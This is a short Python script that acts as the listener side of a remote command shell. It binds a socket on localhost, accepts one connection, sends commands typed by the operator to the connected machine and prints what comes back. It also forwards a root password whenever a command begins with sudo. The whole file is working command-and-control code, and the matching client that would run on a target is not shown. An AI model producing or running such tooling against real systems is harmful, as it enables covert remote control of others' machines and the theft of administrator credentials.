#! /usr/bin/python3
import socket
import getpass
# socket connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)  # Reuse Address
s.bind(("127.0.0.1",8888))  # Bind Socket To IP And Port
# start listening for connections
s.listen(1)
print("listening...")
# accepting connection request
client,addr = s.accept()
print(addr)
# command sending and receiving output
while True:
    cmd = input("$ ")  # Taking Command Input
    client.send(cmd.encode())  # Sending Command
    # Exit Functionality
    if cmd == "exit":
        break
    # Using Sudo With Command We Sending
    elif cmd[0:4] == "sudo":
        r = getpass.getpass("Enter root Pass Here:- ")
        client.send(r.encode())
        print(client.recv(8192).decode())
        continue
    # Directly sending commands if sudo or exit not used
    output = client.recv(8192).decode()
    print(output)
# exiting the code
client.close()
s.close()
print("Bye-Bye ^_^")



